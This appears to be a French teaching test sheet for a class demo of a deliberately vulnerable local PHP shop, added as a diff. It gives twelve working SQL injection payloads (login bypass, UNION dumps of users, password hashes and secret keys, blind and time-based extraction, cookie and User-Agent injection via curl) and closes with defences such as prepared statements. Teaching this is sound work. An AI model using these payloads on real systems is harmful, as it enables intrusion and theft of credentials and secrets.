@@ -1,0 +1,430 @@
+================================================================
+   SHOPCM — FICHE DE TESTS POUR LA PRÉSENTATION
+   TP Sécurité Web — Injection SQL — Mai 2026
+================================================================
+URL de base : http://localhost/shopcm/
+Mode par défaut au démarrage : VULNÉRABLE (badge rouge)
+================================================================
+
+
+════════════════════════════════════════════════════════════════
+ COMPTES DE TEST — ACCÈS RÉELS
+════════════════════════════════════════════════════════════════
+
+ ── COMPTES ADMINISTRATEURS ──────────────────────────────────
+ URL : http://localhost/shopcm/admin/login.php
+
+   Identifiant : admin          Mot de passe : admin123
+   Identifiant : gestion        Mot de passe : gestion456
+
+ ── COMPTES CLIENTS ──────────────────────────────────────────
+ URL : http://localhost/shopcm/pages/connexion.php
+
+   Email : mballa@gmail.com          Mot de passe : pass1234
+   Email : nkomo.marie@gmail.com     Mot de passe : marie2025
+   Email : fotso.paul@gmail.com      Mot de passe : paul@CM
+   Email : talla.s@gmail.com         Mot de passe : sandrine99
+   Email : etoa.c@gmail.com          Mot de passe : christian1
+   Email : bidoung.a@gmail.com       Mot de passe : aline2026
+   Email : mvondo.r@gmail.com        Mot de passe : robert77
+   Email : kouam.e@gmail.com         Mot de passe : estelle88
+
+ NOTE : En mode VULNÉRABLE le champ email accepte n'importe quel
+        texte (pas de validation @). En mode SÉCURISÉ il redevient
+        type="email" — les payloads doivent passer par Burp/curl.
+
+════════════════════════════════════════════════════════════════
+ AVANT DE COMMENCER
+════════════════════════════════════════════════════════════════
+
+ 1. Lancer WampServer (icône verte dans la barre des tâches)
+ 2. Importer la base : phpMyAdmin > Importer > sql/shopcm_db.sql
+ 3. Ouvrir : http://localhost/shopcm/
+ 4. Vérifier que le badge rouge "⚠️ MODE: VULNÉRABLE" est visible
+ 5. Ouvrir l'encart "📋 Voir la dernière requête SQL exécutée"
+    (il se déroule sous le badge — cliquer dessus)
+
+ CONSEIL : Ouvrir DevTools (F12) > onglet Application > Cookies
+           pour la démo du panier (Vuln #8)
+
+
+════════════════════════════════════════════════════════════════
+ ACTE 1 — "L'INTRUS ENTRE"  (~5 min)
+════════════════════════════════════════════════════════════════
+
+────────────────────────────────────────────────────────────────
+ VULN #7 — Bypass login CLIENT
+ URL : http://localhost/shopcm/pages/connexion.php
+ CODE SOURCE :
+   ⚠️ Vulnérable : pages/connexion.php  — ligne 27
+                   $query = "SELECT * FROM users WHERE email='$email' AND password='$pass'"
+   ✅ Sécurisé   : pages/connexion.php  — ligne 51
+                   $stmt = $pdo->prepare("SELECT * FROM users WHERE email = ?")
+────────────────────────────────────────────────────────────────
+
+ Champ EMAIL    →  ' OR 1=1-- -
+ Champ MOT DE PASSE  →  test  (n'importe quoi)
+
+ Résultat attendu : connexion réussie en tant que "Jean Mballa"
+                    sans connaître le vrai mot de passe
+
+ Requête SQL générée (visible dans l'encart) :
+   SELECT * FROM users WHERE email='' OR 1=1-- -' AND password='test'
+
+ → Se déconnecter après la démo :
+   http://localhost/shopcm/pages/deconnexion.php
+
+
+────────────────────────────────────────────────────────────────
+ VULN #11 — Bypass login ADMIN
+ URL : http://localhost/shopcm/admin/login.php
+ CODE SOURCE :
+   ⚠️ Vulnérable : admin/login.php  — ligne 37
+                   $query = "SELECT * FROM admins WHERE username='$username' AND password='$password'"
+   ✅ Sécurisé   : admin/login.php  — ligne 60
+                   $stmt = $pdo->prepare("SELECT * FROM admins WHERE username = ?")
+────────────────────────────────────────────────────────────────
+
+ Champ USERNAME  →  admin' OR '1'='1'-- -
+ Champ MOT DE PASSE  →  test  (n'importe quoi)
+
+ Résultat attendu : accès au tableau de bord administrateur
+                    sans mot de passe
+
+ Alternative UNION (injecter un faux admin) :
+   ' UNION SELECT 1,'pirate','hash',4,5 FROM admins WHERE '1'='1'-- -
+
+ → Se déconnecter :
+   http://localhost/shopcm/admin/deconnexion.php
+
+
+════════════════════════════════════════════════════════════════
+ ACTE 2 — "LE PILLAGE DE LA BASE"  (~8 min)
+════════════════════════════════════════════════════════════════
+
+────────────────────────────────────────────────────────────────
+ VULN #1 — UNION SELECT (extraction emails + mots de passe)
+ URL : http://localhost/shopcm/pages/produits.php
+ CODE SOURCE :
+   ⚠️ Vulnérable : pages/produits.php  — ligne 101
+                   $query = "SELECT * FROM produits WHERE nom LIKE '%$search%'..."
+   ✅ Sécurisé   : pages/produits.php  — ligne 112
+                   $stmt = $pdo->prepare("SELECT * FROM produits WHERE nom LIKE ?...")
+────────────────────────────────────────────────────────────────
+
+ Dans le champ RECHERCHE, coller exactement :
+
+   %' UNION SELECT id,email,password,nom,prenom,telephone,adresse,date_inscription FROM users-- -
+
+ Résultat attendu : la grille affiche les emails et hash bcrypt
+                    de tous les clients (Mballa, Nkomo, Fotso...)
+
+ Note : les colonnes "Nom" et "Prix" affichent les emails/hashs
+        car le UNION mappe les colonnes de produits sur users
+
+
+────────────────────────────────────────────────────────────────
+ VULN #2 — Découverte des tables cachées (information_schema)
+ URL : http://localhost/shopcm/pages/produits.php?cat=
+ CODE SOURCE :
+   ⚠️ Vulnérable : pages/produits.php  — ligne 131
+                   $query = "SELECT * FROM produits WHERE categorie_id = '$cat'"
+   ✅ Sécurisé   : pages/produits.php  — ligne 142
+                   $stmt = $pdo->prepare("SELECT * FROM produits WHERE categorie_id = ? AND actif = 1")
+────────────────────────────────────────────────────────────────
+
+ Coller dans la barre d'adresse (URL complète) :
+
+   http://localhost/shopcm/pages/produits.php?cat=%27+UNION+SELECT+1,table_name,table_schema,4,5,6,7,8+FROM+information_schema.tables+WHERE+table_schema=%27shopcm_db%27--+-
+
+ Résultat attendu : liste de toutes les tables de la base,
+                    dont "secrets_internes" (jamais visible sur le site !)
+
+
+────────────────────────────────────────────────────────────────
+ VULN #5 — Extraction des secrets internes via fiche produit
+ URL : http://localhost/shopcm/pages/produit.php?id=
+ CODE SOURCE :
+   ⚠️ Vulnérable : pages/produit.php  — ligne 25
+                   $query = "SELECT * FROM produits WHERE id = $id"
+   ✅ Sécurisé   : pages/produit.php  — ligne 36
+                   $stmt = $pdo->prepare("SELECT * FROM produits WHERE id = ? AND actif = 1")
+────────────────────────────────────────────────────────────────
+
+ Coller dans la barre d'adresse :
+
+   http://localhost/shopcm/pages/produit.php?id=-1+UNION+SELECT+1,cle,valeur,4,5,6,7,8+FROM+secrets_internes--+-
+
+ Résultat attendu : la fiche produit affiche les clés secrètes :
+                    STRIPE_API_KEY, SMTP_PASSWORD, JWT_SECRET...
+
+ Bonus (produits inactifs) :
+   http://localhost/shopcm/pages/produit.php?id=1+OR+1%3D1
+   → affiche des produits normalement masqués (actif=0)
+
+
+════════════════════════════════════════════════════════════════
+ ACTE 3 — "LES ATTAQUES INVISIBLES"  (~7 min)
+════════════════════════════════════════════════════════════════
+
+────────────────────────────────────────────────────────────────
+ VULN #10 — Bypass + Boolean blind (codes promo)
+ URL : http://localhost/shopcm/pages/promo.php
+ CODE SOURCE :
+   ⚠️ Vulnérable : pages/promo.php  — ligne 34
+                   $query = "SELECT * FROM codes_promo WHERE code = '$code' AND actif = 1..."
+   ✅ Sécurisé   : pages/promo.php  — ligne 45
+                   $stmt = $pdo->prepare("SELECT * FROM codes_promo WHERE code = ? AND actif = 1...")
+────────────────────────────────────────────────────────────────
+
+ ── PARTIE A : BYPASS (code fictif rendu valide) ────────────────
+
+ ÉTAPE 0 — Taper un code qui n'existe PAS dans la base :
+   Code →  CODECADEAU
+   Résultat : ❌ Code invalide  ← confirmation que le code est faux
+
+ ÉTAPE 0b — Même code fictif avec injection OR :
+   Code →  CODECADEAU' OR '1'='1'-- -
+   Résultat : ✅ Code valide ! Réduction : 20%  ← BYPASS !
+
+ Requête SQL générée (visible dans l'encart) :
+   SELECT * FROM codes_promo WHERE code = 'CODECADEAU' OR '1'='1'-- -'
+                                   AND actif = 1 AND date_expiration >= CURDATE()
+ → '1'='1' est toujours vrai → retourne le premier code en base
+ → le site accorde une réduction sur un code qui n'existe pas !
+
+ ── PARTIE B : BOOLEAN BLIND (extraction silencieuse) ───────────
+
+ ÉTAPE 1 — Confirmer que le code NOEL2025 existe :
+   Code →  NOEL2025
+   Résultat : ✅ Code valide ! Réduction : 20%
+
+ ÉTAPE 2 — Condition vraie (1=1) :
+   Code →  NOEL2025' AND 1=1-- -
+   Résultat : ✅ Code valide !  ← la condition est vraie
+
+ ÉTAPE 3 — Condition fausse (1=2) :
+   Code →  NOEL2025' AND 1=2-- -
+   Résultat : ❌ Code invalide  ← la condition est fausse
+
+ ÉTAPE 4 — Exfiltration : premier caractère du hash admin :
+   Code →  NOEL2025' AND SUBSTRING((SELECT password FROM admins LIMIT 1),1,1)='$'-- -
+   Résultat : ✅ Code valide !  ← bcrypt commence toujours par $
+
+ Explication : en répétant l'étape 4 avec chaque caractère,
+               on reconstitue le hash complet (~60 requêtes)
+
+
+────────────────────────────────────────────────────────────────
+ VULN #9 — Time-based blind (suivi commande)
+ URL : http://localhost/shopcm/pages/suivi.php
+ CODE SOURCE :
+   ⚠️ Vulnérable : pages/suivi.php  — ligne 43
+                   $query = "SELECT * FROM commandes WHERE numero_suivi = '$numero'"
+   ✅ Sécurisé   : pages/suivi.php  — ligne 55
+                   $stmt = $pdo->prepare("SELECT * FROM commandes WHERE numero_suivi = ?")
+────────────────────────────────────────────────────────────────
+
+ Numéro normal (rapide) :
+   SHOP-2025-0001
+   → réponse en ~3ms
+
+ Payload avec SLEEP (lent) :
+   SHOP-2025-0001' AND SLEEP(5)-- -
+   → la page met ~5 secondes à répondre
+   → l'encart SQL affiche : "Temps d'exécution : ~5000ms"
+   → rien ne change visuellement = attaque AVEUGLE
+
+ Montrer : le site semble normal mais quelque chose se passe
+           en coulisse — le temps de réponse le trahit
+
+
+════════════════════════════════════════════════════════════════
+ ACTE 4 — "LES VECTEURS CACHÉS"  (~5 min)
+════════════════════════════════════════════════════════════════
+
+────────────────────────────────────────────────────────────────
+ VULN #6 — Stored SQLi (avis produit)
+ URL : http://localhost/shopcm/pages/produit.php?id=1
+ CODE SOURCE :
+   ⚠️ Vulnérable : pages/produit.php  — ligne 60
+                   $query = "INSERT INTO avis (...) VALUES ($produit_id, $user_id, $note, '$commentaire', NOW())"
+   ✅ Sécurisé   : pages/produit.php  — ligne 72
+                   $stmt = $pdo->prepare("INSERT INTO avis (...) VALUES (?, ?, ?, ?, NOW())")
+────────────────────────────────────────────────────────────────
+
+ Aller sur n'importe quelle fiche produit, ex :
+   http://localhost/shopcm/pages/produit.php?id=1
+
+ Dans le formulaire "Laisser un avis", champ Commentaire :
+
+   test', NOW()), (1, 1, 5, (SELECT password FROM admins LIMIT 1), NOW())-- -
+
+ Cliquer "Publier mon avis"
+
+ Résultat attendu : le hash bcrypt du mot de passe admin
+                    apparaît dans la liste des avis,
+                    VISIBLE PAR TOUS LES VISITEURS
+                    et PERSISTANT en base de données
+
+
+────────────────────────────────────────────────────────────────
+ VULN #8 — Injection via cookie PANIER
+ URL : http://localhost/shopcm/pages/panier.php
+ CODE SOURCE :
+   ⚠️ Vulnérable : pages/panier.php  — ligne 55
+                   $query = "SELECT * FROM produits WHERE id = $pid"
+   ✅ Sécurisé   : pages/panier.php  — ligne 65
+                   $stmt = $pdo->prepare("SELECT * FROM produits WHERE id = ? AND actif = 1")
+────────────────────────────────────────────────────────────────
+
+ ÉTAPE 1 : Ajouter un produit au panier (bouton 🛒 sur l'accueil)
+ ÉTAPE 2 : Aller sur http://localhost/shopcm/pages/panier.php
+ ÉTAPE 3 : F12 > Application > Cookies > localhost > "panier"
+ ÉTAPE 4 : Remplacer la valeur du cookie par :
+
+   [{"id":"1 UNION SELECT 1,cle,valeur,4,5,6,7,8 FROM secrets_internes-- -","qty":1}]
+
+ ÉTAPE 5 : Recharger la page (F5)
+
+ Résultat attendu : le panier affiche les clés secrètes
+                    à la place des produits
+
+
+────────────────────────────────────────────────────────────────
+ VULN #12 — Injection via header User-Agent
+ URL : http://localhost/shopcm/admin/logs.php
+ CODE SOURCE :
+   ⚠️ Vulnérable : admin/logs.php  — ligne 44
+                   $query = "INSERT INTO logs_connexion (ip, user_agent, date_log) VALUES ('$ip', '$ua', NOW())"
+   ✅ Sécurisé   : admin/logs.php  — ligne 56
+                   $stmt = $pdo->prepare("INSERT INTO logs_connexion (ip, user_agent, date_log) VALUES (?, ?, NOW())")
+────────────────────────────────────────────────────────────────
+
+ PRÉREQUIS : être connecté en admin (voir Vuln #11 ci-dessus)
+
+ Ouvrir un terminal et exécuter cette commande :
+
+   curl -A "Mozilla', NOW()), ('127.0.0.1', (SELECT password FROM admins LIMIT 1), NOW())-- -" http://localhost/shopcm/admin/logs.php
+
+ Puis recharger la page dans le navigateur :
+   http://localhost/shopcm/admin/logs.php
+
+ Résultat attendu : dans le tableau des logs, la colonne
+                    "User-Agent" affiche le hash bcrypt du
+                    mot de passe admin — injecté via un header
+                    HTTP, sans passer par aucun formulaire
+
+
+════════════════════════════════════════════════════════════════
+ CONCLUSION — "LA DÉFENSE"  (~10 min)
+════════════════════════════════════════════════════════════════
+
+ ÉTAPE 1 : Cliquer sur "Basculer en mode SÉCURISÉ"
+           → le badge passe au vert 🛡️
+
+ ÉTAPE 2 : Relancer exactement les mêmes payloads :
+
+   Vuln #7  : ' OR 1=1-- -            → "Email ou mot de passe incorrect."
+   Vuln #11 : admin' OR '1'='1'-- -   → "Identifiants incorrects."
+   Vuln #1  : %' UNION SELECT...      → 0 résultat
+   Vuln #5  : id=-1 UNION SELECT...   → "Produit introuvable."
+   Vuln #9  : SLEEP(5)                → réponse en ~3ms (SLEEP ignoré)
+   Vuln #10 : NOEL2025' AND 1=1-- -   → "Code invalide."
+
+ ÉTAPE 3 : Montrer l'encart SQL en mode sécurisé :
+   → La requête affiche des "?" à la place des valeurs
+   → Les "Paramètres liés" sont affichés séparément
+   → L'injection est transmise comme TEXTE, pas comme SQL
+
+ ÉTAPE 4 : Les 4 piliers de la défense :
+
+   1. REQUÊTES PRÉPARÉES  → PDO prepare() + execute()
+      Protection : séparation stricte code SQL / données
+
+   2. WHITELIST            → ORDER BY seulement sur [nom, prix, stock]
+      Protection : valider que l'entrée fait partie d'une liste autorisée
+
+   3. MOINDRE PRIVILÈGE    → utilisateur MySQL avec droits limités
+      Protection : même si injection, pas de DROP/CREATE/FILE
+
+   4. VALIDATION DE TYPE   → (int)$id, (float)$min
+      Protection : forcer le type attendu avant d'utiliser la valeur
+
+
+════════════════════════════════════════════════════════════════
+ BONUS — VULN #3 et #4 (si temps disponible)
+════════════════════════════════════════════════════════════════
+
+────────────────────────────────────────────────────────────────
+ VULN #3 — Injection numérique sur filtre de prix
+ CODE SOURCE :
+   ⚠️ Vulnérable : pages/produits.php  — ligne 160
+                   $query = "SELECT * FROM produits WHERE prix >= $min AND prix <= $max AND actif=1"
+   ✅ Sécurisé   : pages/produits.php  — ligne 171
+                   $stmt = $pdo->prepare("SELECT * FROM produits WHERE prix >= ? AND prix <= ? AND actif = 1")
+────────────────────────────────────────────────────────────────
+   URL :
+   http://localhost/shopcm/pages/produits.php?min=0+UNION+SELECT+1,cle,valeur,4,5,6,7,8+FROM+secrets_internes--+-
+   Résultat : les secrets internes s'affichent dans la grille produits
+
+────────────────────────────────────────────────────────────────
+ VULN #4 — ORDER BY injection (délai)
+ CODE SOURCE :
+   ⚠️ Vulnérable : pages/produits.php  — ligne 83 (clause) + ligne 189 (requête)
+                   $order_clause = $order  (aucune validation)
+   ✅ Sécurisé   : pages/produits.php  — ligne 88-90 (whitelist) + ligne 201
+                   $whitelist = ['nom','prix','stock']
+────────────────────────────────────────────────────────────────
+   URL :
+   http://localhost/shopcm/pages/produits.php?order=(SELECT+SLEEP(3))
+   Résultat : la page met ~3 secondes à répondre
+
+
+════════════════════════════════════════════════════════════════
+ RÉCAPITULATIF DES PAYLOADS (copier-coller rapide)
+════════════════════════════════════════════════════════════════
+
+ #7  email       : ' OR 1=1-- -
+ #11 username    : admin' OR '1'='1'-- -
+ #1  search      : %' UNION SELECT id,email,password,nom,prenom,telephone,adresse,date_inscription FROM users-- -
+ #2  cat         : ' UNION SELECT 1,table_name,table_schema,4,5,6,7,8 FROM information_schema.tables WHERE table_schema='shopcm_db'-- -
+ #3  min         : 0 UNION SELECT 1,cle,valeur,4,5,6,7,8 FROM secrets_internes-- -
+ #4  order       : (SELECT SLEEP(3))
+ #5  id          : -1 UNION SELECT 1,cle,valeur,4,5,6,7,8 FROM secrets_internes-- -
+ #6  commentaire : test', NOW()), (1, 1, 5, (SELECT password FROM admins LIMIT 1), NOW())-- -
+ #8  cookie      : [{"id":"1 UNION SELECT 1,cle,valeur,4,5,6,7,8 FROM secrets_internes-- -","qty":1}]
+ #9  numero      : SHOP-2025-0001' AND SLEEP(5)-- -
+ #10 bypass      : CODECADEAU' OR '1'='1'-- -
+ #10 blind       : NOEL2025' AND 1=1-- -
+ #10 exfil       : NOEL2025' AND SUBSTRING((SELECT password FROM admins LIMIT 1),1,1)='$'-- -
+ #11 username    : admin' OR '1'='1'-- -
+ #12 curl        : curl -A "Mozilla', NOW()), ('127.0.0.1', (SELECT password FROM admins LIMIT 1), NOW())-- -" http://localhost/shopcm/admin/logs.php
+
+
+════════════════════════════════════════════════════════════════
+ EN CAS DE PROBLÈME
+════════════════════════════════════════════════════════════════
+
+ Base de données vide ou erreur de connexion :
+   → Réimporter sql/shopcm_db.sql dans phpMyAdmin
+
+ Le toggle ne fonctionne pas :
+   → Vider les cookies du navigateur et recharger
+
+ SLEEP(5) ne produit pas de délai en mode sécurisé :
+   → C'est normal ! C'est exactement ce qu'on veut montrer
+
+ Le curl de la Vuln #12 retourne "403 Forbidden" :
+   → Se connecter d'abord en admin via le navigateur
+     (la session cookie n'est pas transmise par curl)
+   → Solution démo : désactiver temporairement la vérif session
+     dans admin/logs.php pour la démo (ligne 20-23)
+
+ Les images ne s'affichent pas :
+   → Vérifier que assets/images/*.jpg existent
+   → L'attribut onerror affiche placeholder.jpg en fallback
+
+================================================================
+ ShopCM — TP Sécurité Web — Mai 2026
+================================================================
